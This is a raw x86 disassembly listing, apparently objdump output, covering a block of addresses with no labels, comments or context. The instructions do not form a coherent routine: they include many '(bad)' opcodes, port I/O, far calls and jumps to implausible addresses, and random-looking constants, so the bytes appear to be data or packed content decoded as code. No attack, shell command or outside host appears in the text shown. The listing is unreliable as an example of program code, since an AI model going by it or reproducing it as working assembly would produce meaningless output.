  426cf4:	out    0xc5,eax
  426cf6:	nop
  426cf7:	addr16 dec eax
  426cf9:	mov    al,bh
  426cfb:	lea    esi,ds:0x189e3f91
  426d01:	mov    WORD PTR [eax+edi*1+0x6b8cdd70],ss
  426d08:	enter  0xeb4b,0x32
  426d0c:	call   0xfaf397db
  426d11:	fnsave [edx+0x29]
  426d14:	xor    ecx,DWORD PTR [ebx+ecx*4+0x7047e1]
  426d1b:	fwait
  426d1c:	mov    al,0x3c
  426d1e:	and    ah,BYTE PTR [ebx]
  426d20:	(bad)  
  426d21:	xchg   edx,eax
  426d22:	jno    0x426d6d
  426d24:	daa    
  426d25:	aaa    
  426d26:	(bad)  
  426d27:	retf   
  426d28:	test   al,0x88
  426d2a:	iret   
  426d2b:	sub    al,BYTE PTR [edi+0x7f50d0bc]
  426d31:	xchg   BYTE PTR [edi+esi*2-0x29891319],al
  426d38:	sbb    eax,0x15e000c3
  426d3d:	xor    BYTE PTR [edx-0x4c],ah
  426d40:	in     eax,dx
  426d41:	add    BYTE PTR ds:0x889d2305,0x4c
  426d48:	and    DWORD PTR ds:0x715903ca,ebp
  426d4e:	add    edx,esi
  426d50:	inc    ecx
  426d51:	dec    esi
  426d52:	les    ebp,FWORD PTR [ebp+0x2a155b91]
  426d58:	inc    ebp
  426d59:	mov    bh,0x5a
  426d5b:	(bad)  
  426d5c:	aas    
  426d5d:	sar    BYTE PTR [ecx+ecx*4],cl
  426d60:	addr16 into 
  426d62:	cmp    DWORD PTR [esp+esi*2-0xbf7b8d7],0xec7ce7f4
  426d6d:	sbb    esi,eax
  426d6f:	aaa    
  426d70:	jle    0x426d89
  426d72:	adc    DWORD PTR [edx*1+0x3625b9f1],esp
  426d79:	xchg   edx,eax
  426d7a:	push   ebp
  426d7b:	or     esi,DWORD PTR [esi+0x59]
  426d7e:	inc    ebp
  426d7f:	sti    
  426d80:	cdq    
  426d81:	aam    0xaf
  426d83:	xchg   esp,esi
  426d85:	inc    edx
  426d86:	jl     0x426d4f
  426d88:	gs ss loop 0x426d3e
  426d8c:	pop    esp
  426d8d:	outs   dx,BYTE PTR ds:[esi]
  426d8e:	mov    dl,0x42
  426d90:	add    ch,al
  426d92:	loop   0x426d71
  426d94:	ror    DWORD PTR [ecx-0x19],0xb0
  426d98:	jns    0x426da6
  426d9a:	sbb    DWORD PTR [eax+0x29],0x0
  426d9e:	adc    edx,ebx
  426da0:	(bad)  
  426da1:	scas   al,BYTE PTR es:[edi]
  426da2:	cmp    al,0x6b
  426da4:	mov    esi,0x28a2f943
  426da9:	push   ds
  426daa:	jno    0x426d73
  426dac:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  426dae:	jno    0x426d70
  426db0:	sbb    bl,bl
  426db2:	push   ds
  426db3:	pop    esi
  426db4:	or     eax,0x8ea5c6f2
  426db9:	jmp    0x6dac28ba
  426dbe:	call   0xdb208f2f
  426dc3:	cld    
  426dc4:	lds    edi,FWORD PTR [edx-0x20cc9889]
  426dca:	sbb    eax,0x325b2f4c
  426dcf:	outs   dx,DWORD PTR ds:[esi]
  426dd0:	dec    ebp
  426dd1:	enter  0xf8c4,0xe1
  426dd5:	pop    ebx
  426dd6:	scas   eax,DWORD PTR es:[edi]
  426dd7:	and    al,0xb9
  426dd9:	popa   
  426dda:	pop    ds
  426ddb:	push   ss
  426ddc:	fisub  WORD PTR [esi-0x39]
  426ddf:	inc    eax
  426de0:	sub    DWORD PTR ds:0xa5ac81e6,eax
  426de6:	or     edi,edi
  426de8:	fld    DWORD PTR [edx]
  426dea:	dec    ecx
  426deb:	push   ebx
  426dec:	xor    ebp,DWORD PTR [ecx+0x40]
  426def:	add    bh,BYTE PTR [edi]
  426df1:	ds dec ebp
  426df3:	pop    ecx
  426df4:	(bad)  
  426df5:	jne    0x426e6a
  426df7:	stos   BYTE PTR es:[edi],al
  426df8:	gs repz loopne 0x426e1c
  426dfc:	out    0xdb,al
  426dfe:	repnz shl DWORD PTR [edi+0x65],cl
  426e02:	jb     0x426dcc
  426e04:	int    0x5b
  426e06:	xchg   esi,eax
  426e07:	or     DWORD PTR [edi],ebx
  426e09:	add    BYTE PTR [ecx+0x67554228],bl
  426e0f:	xor    DWORD PTR [bx+si],0xffffffa0
  426e13:	xchg   edi,eax
  426e14:	loop   0x426dca
  426e16:	call   0xe43b6ac8
  426e1b:	sbb    BYTE PTR [edx+0x51],bh
  426e1e:	lock adc bl,BYTE PTR [edx+0x61]
  426e22:	or     DWORD PTR [ebx+0x6f],ecx
  426e25:	sub    BYTE PTR [eax-0x4fc3adb9],al
  426e2b:	adc    ebx,ebp
  426e2d:	pushf  
  426e2e:	ds xchg esp,eax
  426e30:	dec    eax
  426e31:	or     al,0x45
  426e33:	push   esi
  426e34:	mov    BYTE PTR [edx],dl
  426e36:	sar    DWORD PTR ds:0x2702a673,0xf8
  426e3d:	xor    BYTE PTR [esi+0x3322c7db],0x4e
  426e44:	fs jl  0x426eb4
  426e47:	fisub  DWORD PTR [esi-0x6566fe87]
  426e4d:	test   BYTE PTR [ebx+0x3d8e5b7],cl
  426e53:	dec    ebx
  426e54:	push   esi
  426e55:	push   esi
  426e56:	mov    WORD PTR [ecx+ebx*8+0x41],ds
  426e5a:	call   0x2f74:0x66f08934
  426e61:	adc    BYTE PTR [ebx],dl
  426e63:	add    al,0x20
  426e65:	xchg   edi,eax
  426e66:	xchg   edx,eax
  426e67:	xchg   esp,eax
  426e68:	mov    ch,0x2d
  426e6a:	xor    DWORD PTR ds:0xef8771a9,edi
  426e70:	xor    DWORD PTR [ecx],ebp
  426e72:	(bad)  
  426e73:	rcr    BYTE PTR ds:0xbd2305ee,cl
  426e79:	fdivr  DWORD PTR [esp+ecx*4+0x78ef0f2a]
  426e80:	xor    DWORD PTR [esi+0x29938c19],edi
  426e86:	paddsb mm3,QWORD PTR [ecx-0x8da3c3a]
  426e8d:	mov    esp,0x54ed1fbc
  426e92:	add    DWORD PTR [esi-0x17],ecx
  426e95:	pop    esp
  426e96:	js     0x426ecd
  426e98:	or     esi,DWORD PTR [edx]
  426e9a:	pop    esi
  426e9b:	in     al,dx
  426e9c:	xchg   esp,eax
  426e9d:	pop    es
  426e9e:	xor    edi,DWORD PTR [ecx-0x6550f8aa]
  426ea4:	mov    ecx,0x1bf40cfd
  426ea9:	sub    al,0xc8
  426eab:	xchg   ecx,eax
  426eac:	int3   
  426ead:	inc    edx
  426eae:	or     eax,0xc6dce66b
  426eb3:	gs test eax,0x646c8607
  426eb9:	(bad)  
  426eba:	sbb    DWORD PTR [edx+0x5f508322],eax
  426ec0:	jl     0x426f17
  426ec2:	enter  0x1bda,0x2b
  426ec6:	into   
  426ec7:	jbe    0x426f33
  426ec9:	scas   eax,DWORD PTR es:[edi]
  426eca:	adc    al,0xcf
  426ecc:	inc    eax
  426ecd:	push   ss
  426ece:	add    eax,0x70188952
  426ed3:	mov    WORD PTR [edx],?
  426ed5:	(bad)  
  426ed7:	mov    bh,0x4d
  426ed9:	mov    bl,0xd5
  426edb:	jp     0x426e87
  426edd:	jp     0x426eae
  426edf:	mov    eax,esp
  426ee1:	mov    ch,0x21
  426ee3:	cdq    
  426ee4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ee5:	mov    BYTE PTR [edi],dh
  426ee7:	jge    0x426e7d
  426ee9:	mov    esi,0xd15b9cc1
  426eee:	cmp    DWORD PTR [ecx+0x15],0x81c28680
  426ef5:	int3   
  426ef6:	ror    DWORD PTR [edi+0x42],cl
  426ef9:	fild   DWORD PTR [eax]
  426efb:	or     bh,BYTE PTR [eax-0x7b823196]
  426f01:	pop    ecx
  426f02:	pop    ebx
  426f03:	adc    edi,DWORD PTR [ebx]
  426f05:	retf   0x90c6
  426f08:	ins    BYTE PTR es:[edi],dx
  426f09:	xchg   esp,eax
  426f0a:	fcmovnb st,st(2)
  426f0c:	jnp    0x426f5b
  426f0e:	xchg   edi,eax
  426f0f:	or     esi,edx
  426f11:	mov    BYTE PTR [eax-0x53],bl
  426f14:	xor    edi,0xf0446e85
  426f1a:	leave  
  426f1b:	xor    eax,0x92d30e03
  426f20:	dec    ecx
  426f21:	adc    al,0xf7
  426f23:	sbb    BYTE PTR [ebp-0xbe2da29],0x55
  426f2a:	sbb    DWORD PTR [eax+0x5c625780],0x55919c79
  426f34:	ss sbb al,0x79
  426f37:	mov    esp,0xdd489bc7
  426f3c:	sbb    al,0x18
  426f3e:	push   edx
  426f3f:	mov    edx,0x25842543
  426f44:	pusha  
  426f45:	add    BYTE PTR [ebp-0x38],cl
  426f48:	mov    bl,BYTE PTR [edi+edx*2]
  426f4b:	retf   
  426f4c:	mov    dh,bl
  426f4e:	cwde   
  426f4f:	call   0xedf46894
  426f54:	sbb    BYTE PTR [ebp+0x52065d08],bl
  426f5a:	(bad)  [ebx]
  426f5d:	xchg   dl,bh
  426f5f:	jae    0x426f22
  426f61:	xor    BYTE PTR [ecx],0xbe
  426f64:	(bad)  
  426f65:	cwde   
  426f66:	shr    BYTE PTR [ebx+0x1b0c0731],1
  426f6c:	mov    esi,DWORD PTR [ebp+0x2d]
  426f6f:	cmp    DWORD PTR [ebp+0x52],esi
  426f72:	cmp    al,ah
  426f74:	adc    dl,BYTE PTR [esi]
  426f76:	cli    
  426f77:	ret    
  426f78:	jecxz  0x426f59
  426f7a:	cwde   
  426f7b:	pop    ebp
  426f7c:	stos   BYTE PTR es:[edi],al
  426f7d:	sbb    ch,BYTE PTR [ebx]
  426f7f:	jge    0x426fca
  426f81:	mov    ds:0x9d25b3a3,al
  426f86:	outs   dx,BYTE PTR ds:[esi]
  426f87:	push   ebx
  426f88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f89:	cmp    eax,0xa6ab8fe7
  426f8e:	dec    ebp
  426f8f:	jge    0x426fbd
  426f91:	mov    al,ds:0xd68a4aa4
  426f96:	ja     0x426fc6
  426f98:	jmp    DWORD PTR [edx]
  426f9a:	pop    ebx
  426f9b:	push   cs
  426f9c:	mov    esi,0xf9243da8
  426fa1:	icebp  
  426fa2:	out    0xa5,eax
  426fa4:	imul   ebp,DWORD PTR [eax-0x22d4ee9c],0xfffffff9
  426fab:	add    eax,0x2281041f
  426fb0:	jae    0x427000
  426fb2:	bound  ebp,QWORD PTR fs:[edi-0x17]
  426fb6:	or     ch,dl
  426fb8:	xchg   edx,eax
  426fb9:	outs   dx,DWORD PTR ds:[esi]
  426fba:	sub    DWORD PTR [edx],edi
  426fbc:	aas    
  426fbd:	mov    eax,0xa9ba4519
  426fc2:	inc    ecx
  426fc3:	(bad)  
  426fc4:	mov    esp,0xe4fbb606
  426fc9:	or     dl,dl
  426fcb:	dec    ecx
  426fcc:	jl     0x426fc8
  426fce:	outs   dx,DWORD PTR ds:[esi]
  426fcf:	adc    al,0x2f
  426fd1:	xchg   esi,eax
  426fd2:	fisubr DWORD PTR fs:[edi]
  426fd5:	jb     0x426f72
  426fd7:	mov    eax,0xd4969ee1
  426fdc:	arpl   WORD PTR [esp+edi*2+0x3ea49c6b],bx
  426fe3:	mov    ebx,0x6a1612ef
  426fe8:	sti    
  426fe9:	(bad)  
  426fea:	stos   BYTE PTR es:[edi],al
  426feb:	mov    ds:0x93b54817,al
  426ff0:	fcomip st,st(6)
  426ff2:	(bad)  
  426ff3:	hlt    
  426ff4:	jp     0x426ffd
  426ff6:	pop    ecx
  426ff7:	jp     0x426fc6
  426ff9:	out    dx,al
  426ffa:	int    0x86
  426ffc:	std    
  426ffd:	pop    edx
  426ffe:	fs dec ebp
  427000:	nop
  427001:	pop    es
  427002:	cvtdq2ps xmm1,xmm1
  427005:	es pop es
  427007:	cmc    
  427008:	cmp    dl,al
  42700a:	xchg   edx,eax
  42700b:	push   edx
  42700c:	inc    DWORD PTR [eax]
  42700e:	aaa    
  42700f:	cmp    edi,0xffffff97
  427012:	cld    
  427013:	sbb    DWORD PTR [ebx],edx
  427015:	(bad)  
  427017:	loope  0x427002
  427019:	jecxz  0x42703a
  42701b:	es inc ecx
  42701d:	xchg   esi,eax
  42701e:	mov    es,esp
  427020:	jo     0x427018
  427022:	xchg   edx,eax
  427023:	add    esp,0x2c
  427026:	add    esp,edi
  427028:	mov    esi,0x642ddc41
  42702d:	and    DWORD PTR [esi-0x4d4b6677],ebx
  427033:	fcom   QWORD PTR [edx]
  427035:	les    esi,FWORD PTR ds:0x20356481
  42703b:	and    BYTE PTR ds:0xc81d468d,bl
  427041:	pop    ebx
  427042:	xor    eax,0x36ac2397
  427047:	xor    dl,BYTE PTR [eax+0x34]
  42704a:	jns    0x427026
  42704c:	pop    es
  42704d:	or     ecx,DWORD PTR [ebx]
  42704f:	ja     0x4270c3
  427051:	sbb    eax,0xe0df80d2
  427056:	outs   dx,BYTE PTR ds:[esi]
  427057:	jmp    eax
  427059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42705a:	daa    
  42705b:	jnp    0x427072
  42705d:	sbb    eax,0xe1e17045
  427062:	mov    ds:0xfd12ca3b,eax
  427067:	xor    ecx,edi
  427069:	and    al,0x96
  42706b:	pop    ds
  42706c:	push   0x110edfa6
  427071:	pop    ds
  427072:	in     eax,0xe8
  427074:	mov    ebp,0x146409cb
  427079:	fdivp  st(2),st
  42707b:	mov    al,ds:0x4ce2926f
  427080:	pop    ds
  427081:	dec    esp
  427082:	in     al,0x2f
  427084:	icebp  
  427085:	jge    0x4270d1
  427087:	xchg   ecx,eax
  427088:	leave  
  427089:	mov    ds:0x6eb8932e,al
  42708e:	jns    0x4270c3
  427090:	outs   dx,DWORD PTR ds:[esi]
  427091:	inc    ecx
  427092:	bound  ebx,QWORD PTR [ebp+0x2b]
  427095:	and    al,0x80
  427097:	xor    al,0xf8
  427099:	pop    ebx
  42709a:	ja     0x427066
  42709c:	out    0x51,al
  42709e:	add    al,al
  4270a0:	int    0x7b
  4270a2:	jnp    0x4270cb
  4270a4:	jns    0x42706c
  4270a6:	inc    ebp
  4270a7:	add    bl,BYTE PTR [bp+di-0x3cec]
  4270ac:	xchg   esp,eax
  4270ad:	xor    BYTE PTR [ebp+0x89ac69e],cl
  4270b3:	pushf  
  4270b4:	fld    DWORD PTR [edi]
  4270b6:	mov    edi,0x4132396e
  4270bb:	aam    0x1d
  4270bd:	or     al,0x9c
  4270bf:	or     al,0x7
  4270c1:	loope  0x427063
  4270c3:	ins    DWORD PTR es:[edi],dx
  4270c4:	sbb    bh,BYTE PTR [ecx+0x9290ce2]
  4270ca:	hlt    
  4270cb:	mov    ah,0x87
  4270cd:	cmp    eax,edx
  4270cf:	and    esp,DWORD PTR [eax-0xe]
  4270d2:	pop    esp
  4270d3:	imul   BYTE PTR [ebx-0x7d590c1b]
  4270d9:	les    edx,FWORD PTR [eax-0x66]
  4270dc:	ss retf 0xce5c
  4270e0:	aam    0x47
  4270e2:	aaa    
  4270e3:	retf   
  4270e4:	jne    0x427136
  4270e6:	jnp    0x4270bb
  4270e8:	ins    BYTE PTR es:[edi],dx
  4270e9:	or     ch,BYTE PTR [esi]
  4270eb:	rol    DWORD PTR [edx],1
  4270ed:	in     al,dx
  4270ee:	jge    0x4270d1
  4270f0:	jbe    0x427128
  4270f2:	sub    eax,0x2663ac1f
  4270f7:	or     eax,0x3c581712
  4270fc:	pop    ebp
  4270fd:	mov    ds:0xd711db2a,eax
  427102:	sahf   
  427103:	mov    al,0x87
  427105:	(bad)  
  427106:	xor    al,0x9
  427108:	jle    0x427139
  42710a:	shl    BYTE PTR [ebp+0x63],0x81
  42710e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42710f:	sbb    BYTE PTR [ebx-0x4e70a474],ch
  427115:	xor    BYTE PTR [esi+0x6a2dad90],0xcc
  42711c:	push   ebp
  42711d:	in     eax,dx
  42711e:	mov    ds:0x77c50ff4,eax
  427123:	in     al,0x27
  427125:	jg     0x42715d
  427127:	push   eax
  427128:	mov    dh,0x18
  42712a:	push   esi
  42712b:	sub    bh,cl
  42712d:	jecxz  0x4270c4
  42712f:	xor    al,0x9a
  427131:	and    BYTE PTR [edi],dh
  427133:	lahf   
  427134:	adc    edx,DWORD PTR [ecx+0x367e9b14]
  42713a:	out    dx,al
  42713b:	sub    esp,DWORD PTR [ebp+0x59]
  42713e:	stos   DWORD PTR es:[edi],eax
  42713f:	sub    ebp,ecx
  427141:	iret   
  427142:	or     edi,ebx
  427144:	outs   dx,BYTE PTR ds:[esi]
  427145:	mov    ebx,0x3c73bc42
  42714a:	mov    ch,0x37
  42714c:	cs daa 
  42714e:	mov    esp,0xadee402d
  427153:	add    cl,BYTE PTR [ebx]
  427155:	xor    eax,edi
  427157:	shr    DWORD PTR [esi],cl
  427159:	(bad)  
  42715a:	add    bl,BYTE PTR [ebx]
  42715c:	stos   DWORD PTR es:[edi],eax
  42715d:	mov    ch,0x51
  42715f:	cmp    eax,0xcdb054b0
  427164:	inc    ecx
  427165:	pop    ss
  427166:	sbb    dl,BYTE PTR [edi-0x73]
  427169:	aad    0x75
  42716b:	test   al,0xbf
  42716d:	test   eax,0xce2a2140
  427173:	sti    
  427174:	push   cs
  427175:	add    eax,0x28916803
  42717a:	mov    eax,0x599ecfd6
  42717f:	fld    TBYTE PTR [di+0x623f]
  427184:	mov    ss,WORD PTR ds:0xdf89878
  42718a:	jl     0x4271c9
  42718c:	sub    BYTE PTR [ebx-0x35],0x26
  427190:	cmc    
  427191:	add    eax,0xf331e358
  427196:	aam    0xe8
  427198:	sub    edi,DWORD PTR [ecx+0x600a13e9]
  42719e:	inc    ebx
  42719f:	ror    DWORD PTR ds:0xdb4a20be,1
  4271a5:	add    dl,BYTE PTR [ecx]
  4271a7:	sbb    DWORD PTR [ecx-0x169fc821],ebp
  4271ad:	add    BYTE PTR [eax],al
  4271af:	add    BYTE PTR [eax],al
  4271b1:	add    BYTE PTR [ebx],ch
  4271b3:	xchg   DWORD PTR [ebp-0x1f],esi
  4271b6:	std    
  4271b7:	repz mov edi,0x7da68ccf
  4271bd:	inc    ecx
  4271be:	les    edx,FWORD PTR [esi]
  4271c0:	retf   
  4271c1:	ja     0x427164
  4271c3:	jmp    0x53571c9
  4271c8:	add    BYTE PTR [eax],al
  4271ca:	shl    ebp,1
  4271cc:	cmp    cl,ch
  4271ce:	adc    BYTE PTR [ecx+0x9],ch
  4271d1:	out    0xa4,al
  4271d3:	les    edi,FWORD PTR [esi+0x7cf94d12]
  4271d9:	clc    
  4271da:	add    al,0x8
  4271dc:	(bad)  
  4271dd:	and    al,0x59
  4271df:	gs stc 
  4271e1:	and    al,0x6f
  4271e3:	imul   edx,DWORD PTR [edi-0x203312e9],0xa79d926e
  4271ed:	mov    ch,BYTE PTR [ecx+0x5e]
  4271f0:	inc    ecx
  4271f1:	sahf   
  4271f2:	xchg   ebp,eax
  4271f3:	call   0x7a2b953e
  4271f8:	mov    ebx,0x2c0309eb
  4271fd:	sar    BYTE PTR [ebx],cl
  4271ff:	retf   
  427200:	xchg   esi,eax
  427201:	push   0x4b830382
  427206:	jmp    FWORD PTR [esi-0x42]
  427209:	mov    esi,0x24f3affd
  42720e:	ja     0x42720e
  427210:	xlat   BYTE PTR ds:[ebx]
  427211:	sub    al,0x79
  427213:	jnp    0x4271c1
  427215:	(bad)  
  427216:	mov    edx,0xf2919400
  42721b:	mov    cl,0x63
  42721d:	push   0xc8e9bfe9
  427222:	jb     0x4271da
  427224:	sti    
  427225:	stos   DWORD PTR es:[edi],eax
  427226:	pop    es
  427227:	xlat   BYTE PTR ds:[ebx]
  427228:	and    ebx,DWORD PTR [eax-0x61fb11dc]
  42722e:	add    ecx,DWORD PTR [ecx+0xfb3c5dd]
  427234:	add    eax,esp
  427236:	mov    bl,0xf1
  427238:	jl     0x427295
  42723a:	inc    ebp
  42723b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42723c:	rcl    DWORD PTR [ebx-0x7e],1
  42723f:	cmp    BYTE PTR [ebx+eiz*4],bh
  427242:	pop    ebx
  427243:	fsubr  DWORD PTR [eax]
  427245:	mov    bh,0xb0
  427247:	outs   dx,DWORD PTR ds:[esi]
  427248:	mov    edx,DWORD PTR [edx+0x47]
  42724b:	outs   dx,DWORD PTR ds:[esi]
  42724c:	add    dl,BYTE PTR [edx+0x2acda106]
  427252:	cmp    BYTE PTR [ecx],0x23
  427255:	mov    al,ds:0x78f70f22
  42725a:	jmp    0x6e9:0xb8b39f10
  427261:	cmc    
  427262:	pop    ebp
  427263:	ror    DWORD PTR [esi-0x32],1
  427266:	xchg   edx,eax
  427267:	scas   al,BYTE PTR es:[edi]
  427268:	mov    dh,0xb9
  42726a:	add    edx,DWORD PTR [ecx]
  42726c:	jo     0x427247
  42726e:	stc    
  42726f:	or     bl,ah
  427271:	arpl   bx,sp
  427273:	outs   dx,BYTE PTR ds:[esi]
  427274:	jmp    0x427214
  427276:	rcr    DWORD PTR [edx-0x76867765],0xb0
  42727d:	pop    edi
  42727e:	dec    eax
  42727f:	push   ecx
  427280:	mov    eax,ds:0x6aec85fd
  427285:	fs jo  0x4272d2
  427288:	inc    eax
  427289:	cwde   
  42728a:	pop    ecx
  42728b:	add    eax,0x9d4547ba
  427290:	test   al,0x9
  427292:	fnstenv [edi+0x7e]
  427295:	jne    0x42722d
  427297:	loopne 0x4272a8
  427299:	es hlt 
  42729b:	cmove  ebx,DWORD PTR [ecx-0x9]
  42729f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272a0:	cmp    ah,BYTE PTR [esi]
  4272a2:	pop    eax
  4272a3:	in     al,dx
  4272a4:	je     0x427296
  4272a6:	pop    es
  4272a7:	ret    0x8bea
  4272aa:	jbe    0x427260
  4272ac:	push   0x835770dd
  4272b1:	inc    esi
  4272b2:	lods   eax,DWORD PTR ds:[esi]
  4272b3:	lds    ecx,FWORD PTR [edi+0xb83d514]
  4272b9:	sbb    eax,DWORD PTR ds:0xe0103a56
  4272bf:	inc    ebx
  4272c0:	jle    0x4272d4
  4272c2:	pop    ecx
  4272c3:	jl     0x427288
  4272c5:	es push eax
  4272c7:	outs   dx,BYTE PTR ds:[esi]
  4272c8:	ficomp DWORD PTR [edi-0x8d8dd02]
  4272ce:	push   cs
  4272cf:	clc    
  4272d0:	outs   dx,BYTE PTR ds:[esi]
  4272d1:	popa   
  4272d2:	lea    ecx,[esi+edi*8-0x59]
  4272d6:	out    0x73,al
  4272d8:	and    esp,ebp
  4272da:	sbb    eax,0x740dc071
  4272df:	jbe    0x427303
  4272e1:	sbb    DWORD PTR [esi],esp
  4272e3:	repnz adc edi,edi
  4272e6:	xchg   edi,eax
  4272e7:	aad    0x9e
  4272e9:	sbb    eax,0xcc50a210
  4272ee:	call   0x8cae:0xe8fd8cd0
  4272f5:	in     eax,0xec
  4272f7:	ins    DWORD PTR es:[edi],dx
  4272f8:	js     0x4272b7
  4272fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272fb:	enter  0x423,0x54
  4272ff:	jle    0x427342
  427301:	jae    0x427354
  427303:	push   ss
  427304:	mov    al,ds:0x95a1b278
  427309:	outs   dx,DWORD PTR ds:[esi]
  42730a:	dec    eax
  42730b:	shr    BYTE PTR [edi-0x1b],cl
  42730e:	mov    BYTE PTR [ebx-0x43ba13f3],dh
  427314:	xchg   BYTE PTR [ecx],cl
  427316:	mov    ecx,0x38d82434
  42731b:	fstp   st(4)
  42731d:	cdq    
  42731e:	pop    edi
  42731f:	sbb    ecx,DWORD PTR [ecx+0x35423748]
  427325:	aaa    
  427326:	mov    ebp,0x1ab324a5
  42732b:	ja     0x42730d
  42732d:	stos   DWORD PTR es:[edi],eax
  42732e:	dec    edi
  42732f:	add    al,dh
  427331:	dec    eax
  427332:	loopne 0x4273a6
  427334:	fwait
  427335:	cld    
  427336:	ins    BYTE PTR es:[edi],dx
  427337:	ss out dx,eax
  427339:	or     DWORD PTR [eax],edx
  42733b:	cmp    al,0x1e
  42733d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42733e:	jl     0x427399
  427340:	mov    edx,0x37b4e71a
  427345:	iret   
  427346:	(bad)
  427349:	or     BYTE PTR [ecx],al
  42734b:	sub    ecx,DWORD PTR [ebp-0x5c2d3d57]
  427351:	out    0xfc,al
  427353:	or     al,0xc5
  427355:	xchg   esp,eax
  427356:	ins    DWORD PTR es:[edi],dx
  427357:	imul   edi,DWORD PTR [edi-0x56],0xffffff88
  42735b:	jmp    0x42733f
  42735d:	aam    0x67
  42735f:	es push ecx
  427361:	scas   al,BYTE PTR es:[edi]
  427362:	add    al,0xa6
  427364:	adc    DWORD PTR [edx],esp
  427366:	cld    
  427367:	jg     0x4273c2
  427369:	xchg   esi,eax
  42736a:	push   eax
  42736b:	pop    ebx
  42736c:	sbb    ecx,ebx
  42736e:	fwait
  42736f:	dec    esp
  427370:	jb     0x4273af
  427372:	dec    edi
  427373:	pop    ebx
  427374:	lds    ebx,FWORD PTR [ebp+0x1ecb315d]
  42737a:	inc    ebx
  42737b:	xor    BYTE PTR [edx],bl
  42737d:	lods   al,BYTE PTR ds:[esi]
  42737e:	(bad)  
  42737f:	div    DWORD PTR ds:0x7b92c173
  427385:	push   ss
  427386:	mov    bl,0xdd
  427388:	jmp    0xd64fae28
  42738d:	dec    esp
  42738e:	sub    DWORD PTR [esi],esi
  427390:	xor    al,0x43
  427392:	and    eax,0xf4bf717e
  427397:	xor    al,0xa3
  427399:	adc    al,0x11
  42739b:	cmp    BYTE PTR [esi+0x64f35572],bh
  4273a1:	push   eax
  4273a2:	dec    ebx
  4273a3:	and    al,0x20
  4273a5:	push   es
  4273a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4273a7:	cmp    BYTE PTR [eax-0x17],bl
  4273aa:	cmp    bl,BYTE PTR [ebx]
  4273ac:	mov    ds:0x29be3c50,al
  4273b1:	aam    0x2f
  4273b3:	push   0x1243b8e6
  4273b8:	inc    edi
  4273b9:	repnz (bad) 
  4273bb:	jb     0x427372
  4273bd:	lea    edx,[edi+0x3fdd0e05]
  4273c3:	jo     0x427391
  4273c5:	xor    eax,0xffcea57d
  4273ca:	jmp    0x4273fc
  4273cc:	dec    esi
  4273cd:	clc    
  4273ce:	sti    
  4273cf:	loopne 0x4273bf
  4273d1:	ins    DWORD PTR es:[edi],dx
  4273d2:	popa   
  4273d3:	sbb    eax,0x3562d281
  4273d8:	pop    esp
  4273d9:	push   ebx
  4273da:	popa   
  4273db:	inc    esp
  4273dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4273dd:	xchg   esp,eax
  4273de:	push   cs
  4273df:	cmp    esp,esi
  4273e1:	scas   al,BYTE PTR es:[edi]
  4273e2:	in     eax,dx
  4273e3:	or     ecx,DWORD PTR [ecx+0x31]
  4273e6:	pop    edx
  4273e7:	mov    edi,0x640d759b
  4273ec:	sbb    dh,dl
  4273ee:	mov    dl,BYTE PTR [ebp+0x2]
  4273f1:	lock jne 0x4273f2
  4273f4:	out    0xc2,al
  4273f6:	leave  
  4273f7:	mov    cs:0x880b40bf,al
  4273fd:	jecxz  0x427469
  4273ff:	push   es
  427400:	out    0xfe,al
  427402:	add    DWORD PTR [ecx-0x3a40a00c],esi
  427408:	mov    ebx,ebp
  42740a:	inc    esi
  42740b:	inc    eax
  42740c:	sbb    eax,0xbd298c1f
  427411:	mov    ah,BYTE PTR [edi-0x3b]
  427414:	test   eax,0x9ef96aed
  427419:	sub    eax,0xa664a738
  42741e:	sbb    edx,esi
  427420:	lods   eax,DWORD PTR ds:[esi]
  427421:	adc    BYTE PTR ss:[ecx],ah
  427424:	mov    esi,0x8b058619
  427429:	in     eax,0xe4
  42742b:	icebp  
  42742c:	out    dx,al
  42742d:	push   es
  42742e:	inc    edx
  42742f:	mov    ebx,DWORD PTR [ebp+0x507dc25d]
  427435:	fmul   DWORD PTR [edx]
  427437:	xchg   edi,eax
  427438:	seta   BYTE PTR [edx]
  42743b:	xchg   esp,eax
  42743c:	adc    cl,BYTE PTR [esi-0x6c363254]
  427442:	sbb    ah,dh
  427444:	push   esp
  427445:	jns    0x4274c0
  427447:	data16 idiv BYTE PTR [eax]
  42744a:	leave  
  42744b:	inc    esi
  42744c:	imul   DWORD PTR [ecx-0x56]
  42744f:	hlt    
  427450:	and    al,0x16
  427452:	enter  0xff04,0x96
  427456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427457:	sti    
  427458:	retf   0xeffb
  42745b:	cmp    eax,0xfd45aef2
  427460:	adc    al,0x2b
  427462:	leave  
  427463:	popa   
  427464:	hlt    
  427465:	ins    DWORD PTR es:[edi],dx
  427466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427467:	aaa    
  427468:	jle    0x427458
  42746a:	out    dx,eax
  42746b:	je     0x427412
  42746d:	xchg   ecx,eax
  42746e:	jp     0x4274d9
  427470:	mov    edi,0x5865c61c
  427475:	cwde   
  427476:	ss mov ebp,0xe6ad06c3
  42747c:	mov    al,BYTE PTR [edx-0x22107c37]
  427482:	push   0x17852a7a
  427487:	inc    eax
  427488:	pop    ebx
  427489:	xchg   edi,eax
  42748a:	ss mov edi,0xfb536175
  427490:	(bad)  
  427491:	(bad)  
  427492:	jmp    0x40f64cc0
  427497:	and    dl,BYTE PTR [ecx-0x2e]
  42749a:	mov    ss,ecx
  42749c:	arpl   WORD PTR [edx+0x4],di
  42749f:	imul   ecx,DWORD PTR [edi-0x24],0x4e3a4c59
  4274a6:	mov    BYTE PTR [edx+0x24],bh
  4274a9:	inc    esi
  4274aa:	shl    esi,0xff
  4274ad:	inc    edi
  4274ae:	cmp    DWORD PTR [edx-0x1549782d],edx
  4274b4:	mov    WORD PTR [edx],es
  4274b6:	mov    eax,ds:0xdc5382d4
